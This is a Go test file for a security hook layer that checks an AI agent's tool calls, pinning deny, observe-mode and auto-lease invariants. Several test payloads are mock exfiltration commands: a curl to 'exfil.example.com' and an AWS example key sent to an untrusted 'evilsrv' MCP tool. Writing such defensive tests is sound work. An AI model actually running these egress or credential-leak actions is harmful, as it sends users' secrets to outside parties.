package hooks

import (
	"strings"
	"testing"

	hookmessages "github.com/somoore/sir/pkg/hooks/messages"
	"github.com/somoore/sir/pkg/lease"
	"github.com/somoore/sir/pkg/ledger"
	"github.com/somoore/sir/pkg/policy"
	"github.com/somoore/sir/pkg/session"
)

// This file holds the floor-pinning safety-net tests (FLOOR-1/2/3). They encode
// the security invariants that every friction-reduction change must preserve, so
// a downgrade that accidentally widens authority, leaks past observe mode, or
// auto-leases under risky posture fails CI before it ships. They are the
// guardrail under the "block less" work, not the work itself.

// TestFloor1_NarrowOnly is the narrow-only invariant (CLAUDE.md non-negotiable
// #2): Go may tighten the oracle's verdict but must never turn a Deny into a
// wire Allow — the single, deliberate exception being observe mode.
func TestFloor1_NarrowOnly(t *testing.T) {
	// --- Verdict-transform unit properties: only applyObserveMode widens. ---
	t.Run("transforms_never_widen", func(t *testing.T) {
		// applyThinkingGuard only degrades ask->deny; it must never widen.
		for _, v := range []policy.Verdict{policy.VerdictDeny, policy.VerdictAllow} {
			r := &HookResponse{Decision: v, Reason: "x"}
			applyThinkingGuard(r, true)
			if r.Decision != v {
				t.Errorf("applyThinkingGuard widened %s -> %s", v, r.Decision)
			}
		}
		// overlayPendingInjectionWarning may tighten allow->ask, never loosen.
		deny := &HookResponse{Decision: policy.VerdictDeny, Reason: "blocked"}
		overlayPendingInjectionWarning(deny, "suspicious tool output")
		if deny.Decision != policy.VerdictDeny {
			t.Errorf("overlayPendingInjectionWarning widened a deny -> %s", deny.Decision)
		}
		allow := &HookResponse{Decision: policy.VerdictAllow, Reason: "ok"}
		overlayPendingInjectionWarning(allow, "suspicious tool output")
		if allow.Decision != policy.VerdictAsk {
			t.Errorf("overlayPendingInjectionWarning should tighten allow->ask under injection, got %s", allow.Decision)
		}
	})

	t.Run("observe_is_the_only_widener", func(t *testing.T) {
		// applyObserveMode is the sanctioned (and only) deny->allow flip.
		r := &HookResponse{Decision: policy.VerdictDeny, Reason: "blocked by default"}
		applyObserveMode(r)
		if r.Decision != policy.VerdictAllow {
			t.Fatalf("observe mode should downgrade deny->allow, got %s", r.Decision)
		}
		if !strings.Contains(r.Reason, "would deny") {
			t.Errorf("observe reason should disclose the would-be verdict, got %q", r.Reason)
		}
	})

	// --- End-to-end: a real oracle Deny stays a wire Deny, except under observe. ---
	t.Run("core_deny_stays_wire_deny_end_to_end", func(t *testing.T) {
		projectRoot := t.TempDir()
		state := newTestSession(t, projectRoot)
		// A strict/managed-style lease forbids external egress, so the oracle
		// hard-denies it even on a clean session (post NET-1, the personal lease
		// would ask). This is a genuine, non-floor oracle Deny.
		l := lease.DefaultLease()
		l.ForbiddenVerbs = []policy.Verb{policy.VerbNetExternal}
		payload := &HookPayload{
			ToolName:  "Bash",
			ToolInput: map[string]interface{}{"command": "curl https://blocked.example.com/x"},
			CWD:       projectRoot,
		}
		resp, err := evaluatePayload(payload, l, state, projectRoot)
		if err != nil {
			t.Fatalf("evaluatePayload: %v", err)
		}
		if resp.Decision != policy.VerdictDeny {
			t.Fatalf("forbidden external egress: want deny, got %s (reason=%s)", resp.Decision, resp.Reason)
		}
	})

	t.Run("observe_downgrades_the_same_deny", func(t *testing.T) {
		// The security invariant is the decision flip: the identical egress that
		// is denied without observe becomes allow under observe. (The reason-wrap
		// disclosure is asserted deterministically in observe_is_the_only_widener;
		// here it is path-dependent — the Rust core downgrades the decision and
		// returns its own reason, while the Go applyObserveMode defer adds the
		// "would deny" wrapper only on the fallback path — so we pin the verdict.)
		projectRoot := t.TempDir()
		state := newTestSession(t, projectRoot)
		l := lease.DefaultLease()
		l.ObserveOnly = true
		payload := &HookPayload{
			ToolName:  "Bash",
			ToolInput: map[string]interface{}{"command": "curl https://exfil.example.com/x"},
			CWD:       projectRoot,
		}
		resp, err := evaluatePayload(payload, l, state, projectRoot)
		if err != nil {
			t.Fatalf("evaluatePayload (observe): %v", err)
		}
		if resp.Decision != policy.VerdictAllow {
			t.Fatalf("observe mode: want allow, got %s (reason=%s)", resp.Decision, resp.Reason)
		}
	})
}

// TestFloor2_FloorSurvivesObserve pins that the control-plane integrity floor is
// evaluated before observe mode is registered, so a compromised control plane
// still blocks even during an observe-only rollout (CLAUDE.md #3/#8).
func TestFloor2_FloorSurvivesObserve(t *testing.T) {
	t.Run("deny_all_survives_observe", func(t *testing.T) {
		projectRoot := t.TempDir()
		state := newTestSession(t, projectRoot)
		state.SetDenyAll("control plane compromised")
		if err := state.Save(); err != nil {
			t.Fatalf("save deny-all session: %v", err)
		}
		l := lease.DefaultLease()
		l.ObserveOnly = true
		// Even a benign read must be denied: deny-all is the floor.
		payload := &HookPayload{
			ToolName:  "Read",
			ToolInput: map[string]interface{}{"file_path": "main.go"},
			CWD:       projectRoot,
		}
		resp, err := evaluatePayload(payload, l, state, projectRoot)
		if err != nil {
			t.Fatalf("evaluatePayload: %v", err)
		}
		if resp.Decision != policy.VerdictDeny {
			t.Fatalf("deny-all must survive observe mode, got %s (reason=%s)", resp.Decision, resp.Reason)
		}
	})

	t.Run("ordinary_deny_does_NOT_survive_observe", func(t *testing.T) {
		// Contrast control: a non-floor deny IS downgraded under observe, proving
		// observe mode is actually active in the deny-all case above.
		projectRoot := t.TempDir()
		state := newTestSession(t, projectRoot)
		l := lease.DefaultLease()
		l.ObserveOnly = true
		payload := &HookPayload{
			ToolName:  "Bash",
			ToolInput: map[string]interface{}{"command": "curl https://exfil.example.com/x"},
			CWD:       projectRoot,
		}
		resp, err := evaluatePayload(payload, l, state, projectRoot)
		if err != nil {
			t.Fatalf("evaluatePayload: %v", err)
		}
		if resp.Decision != policy.VerdictAllow {
			t.Fatalf("ordinary deny should downgrade under observe, got %s", resp.Decision)
		}
	})
}

// TestObserve1_FloorExemption (OBSERVE-1) pins that observe mode never silently
// allows the security floor: a credential leak to an untrusted MCP server, or
// egress while the session carries secret context, stays DENIED even under an
// observe-only rollout — because allowing it "just to observe" is real
// exfiltration, not a would-block signal. Clean-session egress (no secret) is
// not floor and remains observe-downgradable (asserted in TestFloor2).
func TestObserve1_FloorExemption(t *testing.T) {
	t.Run("mcp_credential_leak_survives_observe", func(t *testing.T) {
		projectRoot := t.TempDir()
		state := newTestSession(t, projectRoot)
		l := lease.DefaultLease()
		l.ObserveOnly = true
		// AKIAIOSFODNN7EXAMPLE is the canonical AWS example key; the server is
		// not in the approved/trusted set, so the credential-leak gate fires.
		payload := &HookPayload{
			ToolName:  "mcp__evilsrv__send_note",
			ToolInput: map[string]interface{}{"note": "AKIAIOSFODNN7EXAMPLE"},
			CWD:       projectRoot,
		}
		resp, err := evaluatePayload(payload, l, state, projectRoot)
		if err != nil {
			t.Fatalf("evaluatePayload: %v", err)
		}
		if resp.Decision != policy.VerdictDeny {
			t.Fatalf("credential leak must stay DENIED under observe, got %s (reason=%s)", resp.Decision, resp.Reason)
		}
	})

	t.Run("secret_session_egress_survives_observe", func(t *testing.T) {
		projectRoot := t.TempDir()
		state := newTestSession(t, projectRoot)
		state.MarkSecretSession()
		if err := state.Save(); err != nil {
			t.Fatalf("save secret session: %v", err)
		}
		l := lease.DefaultLease()
		l.ObserveOnly = true
		payload := &HookPayload{
			ToolName:  "Bash",
			ToolInput: map[string]interface{}{"command": "curl https://exfil.example.com/x"},
			CWD:       projectRoot,
		}
		resp, err := evaluatePayload(payload, l, state, projectRoot)
		if err != nil {
			t.Fatalf("evaluatePayload: %v", err)
		}
		if resp.Decision != policy.VerdictDeny {
			t.Fatalf("secret-context egress must stay DENIED under observe, got %s (reason=%s)", resp.Decision, resp.Reason)
		}
	})
}

// TestObserve1_FloorDenialsRecordedAsEnforced pins that a Floor verdict
// enforced under observe mode is recorded in the ledger as a REAL deny (it was
// blocked), not would_deny — so sir why / friction / SIEM never misreport an
// enforced security event as hypothetical during an observe rollout. A
// non-floor verdict still records the would_* form.
func TestObserve1_FloorDenialsRecordedAsEnforced(t *testing.T) {
	lastDecision := func(t *testing.T, projectRoot string) string {
		t.Helper()
		entries, err := ledger.ReadAll(projectRoot)
		if err != nil {
			t.Fatalf("read ledger: %v", err)
		}
		if len(entries) == 0 {
			t.Fatal("ledger empty")
		}
		return entries[len(entries)-1].Decision
	}

	t.Run("secret_egress_floor_recorded_as_deny", func(t *testing.T) {
		projectRoot := t.TempDir()
		state := newTestSession(t, projectRoot)
		state.MarkSecretSession()
		if err := state.Save(); err != nil {
			t.Fatalf("save: %v", err)
		}
		l := lease.DefaultLease()
		l.ObserveOnly = true
		if _, err := evaluatePayload(&HookPayload{ToolName: "Bash", ToolInput: map[string]interface{}{"command": "curl https://exfil.example.com/x"}, CWD: projectRoot}, l, state, projectRoot); err != nil {
			t.Fatalf("evaluatePayload: %v", err)
		}
		if d := lastDecision(t, projectRoot); d != "deny" {
			t.Fatalf("secret-egress floor under observe: ledger decision = %q, want deny (enforced)", d)
		}
	})

	t.Run("credential_leak_floor_recorded_as_deny", func(t *testing.T) {
		projectRoot := t.TempDir()
		state := newTestSession(t, projectRoot)
		l := lease.DefaultLease()
		l.ObserveOnly = true
		if _, err := evaluatePayload(&HookPayload{ToolName: "mcp__evilsrv__send_note", ToolInput: map[string]interface{}{"note": "AKIAIOSFODNN7EXAMPLE"}, CWD: projectRoot}, l, state, projectRoot); err != nil {
			t.Fatalf("evaluatePayload: %v", err)
		}
		if d := lastDecision(t, projectRoot); d != "deny" {
			t.Fatalf("credential-leak floor under observe: ledger decision = %q, want deny (enforced)", d)
		}
	})

	t.Run("non_floor_deny_still_recorded_would_deny", func(t *testing.T) {
		// A clean-session forbidden egress is a non-floor deny: observe downgrades
		// the wire to allow, and the ledger correctly records would_deny.
		projectRoot := t.TempDir()
		state := newTestSession(t, projectRoot)
		l := lease.DefaultLease()
		l.ObserveOnly = true
		l.ForbiddenVerbs = []policy.Verb{policy.VerbNetExternal}
		if _, err := evaluatePayload(&HookPayload{ToolName: "Bash", ToolInput: map[string]interface{}{"command": "curl https://blocked.example.com/x"}, CWD: projectRoot}, l, state, projectRoot); err != nil {
			t.Fatalf("evaluatePayload: %v", err)
		}
		if d := lastDecision(t, projectRoot); d != "would_deny" {
			t.Fatalf("non-floor clean egress under observe: ledger decision = %q, want would_deny", d)
		}
	})
}

// TestFloor3_AutoLeaseNeverWidens pins that auto-leasing — a friction feature —
// never expands approved hosts under any risky posture, and only ever after an
// observed approval (a pending marker redeemed at PostToolUse).
func TestFloor3_AutoLeaseNeverWidens(t *testing.T) {
	newState := func(t *testing.T) *session.State {
		return session.NewState(t.TempDir())
	}

	t.Run("safe_context_gating", func(t *testing.T) {
		if !autoLeaseSafeContext(newState(t)) {
			t.Error("a fresh normal session should be a safe auto-lease context")
		}
		cases := map[string]func(*session.State){
			"secret session":    func(s *session.State) { s.MarkSecretSession() },
			"pending injection": func(s *session.State) { s.SetPendingInjectionAlert("x") },
			"elevated posture":  func(s *session.State) { s.RaisePosture(policy.PostureStateElevated) },
			"tainted mcp":       func(s *session.State) { s.AddTaintedMCPServer("evil") },
		}
		for name, mutate := range cases {
			s := newState(t)
			mutate(s)
			if autoLeaseSafeContext(s) {
				t.Errorf("%s must NOT be a safe auto-lease context", name)
			}
		}
	})

	t.Run("pending_mark_requires_ask_egress_and_safe_context", func(t *testing.T) {
		l := lease.DefaultLease() // AutoLeaseApprovedHosts = true
		target := "https://api.example.com/v1"
		// Guarantee the host-extraction precondition so the assertions below are
		// never silently skipped — a vacuous safety-net test is worse than none.
		host, ok := hookmessages.ExtractHostForMessage(target)
		if !ok || host == "" {
			t.Fatalf("test precondition broken: ExtractHostForMessage(%q) = (%q, %v), want a host", target, host, ok)
		}
		egress := Intent{Verb: policy.VerbNetExternal, Target: target}

		// allow (not ask) never marks
		s := newState(t)
		maybeMarkAutoLeasePending(l, s, egress, policy.VerdictAllow)
		if s.ConsumePendingAutoLease(host) {
			t.Error("an allow verdict must not mark a pending auto-lease")
		}

		// ask + safe + egress marks (the one positive path)
		s = newState(t)
		maybeMarkAutoLeasePending(l, s, egress, policy.VerdictAsk)
		if !s.ConsumePendingAutoLease(host) {
			t.Errorf("a clean external-egress ask should mark a pending auto-lease for %q", host)
		}

		// ask + unsafe context does NOT mark
		s = newState(t)
		s.MarkSecretSession()
		maybeMarkAutoLeasePending(l, s, egress, policy.VerdictAsk)
		if s.ConsumePendingAutoLease(host) {
			t.Error("a secret session must not mark a pending auto-lease")
		}

		// ask + non-egress verb does NOT mark
		s = newState(t)
		readIntent := Intent{Verb: policy.VerbReadRef, Target: ".env"}
		maybeMarkAutoLeasePending(l, s, readIntent, policy.VerdictAsk)
		if s.ConsumePendingAutoLease(".env") {
			t.Error("a non-egress verb must not mark a pending auto-lease")
		}

		// auto-lease disabled on the lease => never marks
		off := lease.DefaultLease()
		off.AutoLeaseApprovedHosts = false
		s = newState(t)
		maybeMarkAutoLeasePending(off, s, egress, policy.VerdictAsk)
		if s.ConsumePendingAutoLease(host) {
			t.Error("auto-lease disabled lease must not mark a pending auto-lease")
		}
	})

	t.Run("approval_never_widens_under_risk_or_without_consent", func(t *testing.T) {
		projectRoot := t.TempDir()
		post := &PostHookPayload{
			ToolName:  "Bash",
			ToolInput: map[string]interface{}{"command": "curl https://api.example.com/v1"},
			CWD:       projectRoot,
		}

		assertNoWiden := func(name string, l *lease.Lease, s *session.State) {
			before := len(l.ApprovedHosts)
			if applyAutoLeaseOnApproval(post, l, s, projectRoot, nil) {
				t.Errorf("%s: applyAutoLeaseOnApproval should not mint a lease", name)
			}
			if len(l.ApprovedHosts) != before {
				t.Errorf("%s: ApprovedHosts widened from %d to %d", name, before, len(l.ApprovedHosts))
			}
		}

		// disabled feature
		off := lease.DefaultLease()
		off.AutoLeaseApprovedHosts = false
		assertNoWiden("auto-lease disabled", off, newState(t))

		// enabled but unsafe context
		secret := newState(t)
		secret.MarkSecretSession()
		assertNoWiden("secret session", lease.DefaultLease(), secret)

		// enabled, safe, but NO observed approval (no pending marker)
		assertNoWiden("no pending consent", lease.DefaultLease(), newState(t))
	})
}
